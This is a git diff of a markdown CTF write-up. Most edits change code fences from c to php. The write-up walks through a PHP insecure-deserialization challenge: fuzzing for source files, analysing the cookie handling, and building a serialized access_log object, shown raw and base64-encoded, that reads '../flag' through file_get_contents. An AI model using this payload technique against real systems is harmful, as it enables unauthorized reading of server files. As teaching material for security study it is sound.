@@ -20,7 +20,8 @@ toc: true
 * All challenges i solved always have attachment source code but this challenge must fuzzing found source code, i used `dirsearch` for fuzzing 
 ![image](https://user-images.githubusercontent.com/79050415/152356327-9c58ddd6-e844-4864-bf66-68569fd4f974.png)
 * I found other pages 
-```c
+
+```php
 index.php
 cookie.php
 authentication.php
@@ -33,7 +34,8 @@ authentication.php
 * After i access other pages i found a source code 
 ## Source Code Analysis
 * `index.phps`
-```c
+
+```php
 <?php
 require_once("cookie.php");
 
@@ -57,7 +59,8 @@ if(isset($_POST["user"]) && isset($_POST["pass"])){
 * if `$perm_res->is_guest()` and `$perm_res->is_admin()` are true `cookie` will create header `Location` set value equal `authentication.php` then its direct from login page to `welcome` page 
 * `setcookie` `login` its created by serialize `$perm_res` variable then ` base64` and `urlencode` 
 * `cookie.phps`
-```c
+
+```php
 <?php
 session_start();
 
@@ -127,10 +130,12 @@ if(isset($_COOKIE["login"])){
 
 ?>
  ```
+ 
  * The function `is_admin()` and ` is_guest()` are same check attribute username and password of `permission` class by query to database `users.db` because 2 function used `prepared statements` and `parameterized queries` so exploit sql injection is impossiable 
  * `IF` block code check cookie of `login` if serialize true its response flag and false its response message `Deserialization error`
  * `authentication.phps`
- ```c
+ 
+ ```php
  <?php
 
 class access_log
@@ -165,7 +170,8 @@ if(isset($perm) && $perm->is_admin()){
 ?>
 ```
 * Class `access_log` have 2 magic methods `__construct` and `__toString`. Method `__toString` response `read_log()`, `read_log()` will response content of file and transmisson ` constructor` of `access_log` class via ` file_get_contents` + Magic method wil execute when class create, therefore i created an object `access_log` 
-```c
+
+```php
 <?php
 
 class access_log {
@@ -182,13 +188,16 @@ echo $serializedObject;
 
 ?>
 ```
+
 * The script when i run 
 ![image](https://user-images.githubusercontent.com/79050415/152373825-40d495e7-8d98-40c5-a1a0-1a4ce1041f1d.png)
-```c
+
+```php
 O:10:"access_log":1:{s:8:"log_file";s:7:"../flag";}
 ```
 * After that i encode payload above to base64 
-```c
+
+```php
 TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9
 ```
 ![image](https://user-images.githubusercontent.com/79050415/152377105-484a584a-6414-42f5-acf9-fa829d09ff4d.png)
